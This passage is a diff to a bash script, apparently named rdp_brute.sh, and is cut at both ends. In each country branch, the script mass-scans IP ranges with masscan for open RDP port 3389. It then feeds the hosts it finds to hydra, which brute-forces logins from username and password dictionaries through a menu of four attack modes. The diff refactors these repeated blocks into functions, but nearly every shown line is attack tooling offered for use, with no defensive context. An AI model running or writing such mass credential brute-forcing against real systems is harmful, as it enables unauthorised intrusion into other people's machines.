-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24824,6 +9963,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24833,53 +9973,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24897,6 +9991,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24906,53 +10001,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "126" ]; then
@@ -24969,6 +10018,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24978,53 +10028,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25042,6 +10046,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25051,53 +10056,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25115,6 +10074,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25124,53 +10084,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25188,6 +10102,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25197,53 +10112,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25261,6 +10130,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25270,53 +10140,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25334,6 +10158,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25343,53 +10168,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25407,6 +10186,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25416,53 +10196,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25480,6 +10214,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25489,53 +10224,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25553,6 +10242,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25562,53 +10252,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25626,6 +10270,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25635,53 +10280,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25699,6 +10298,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25708,53 +10308,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25772,6 +10326,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25781,53 +10336,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25845,6 +10354,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25854,53 +10364,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
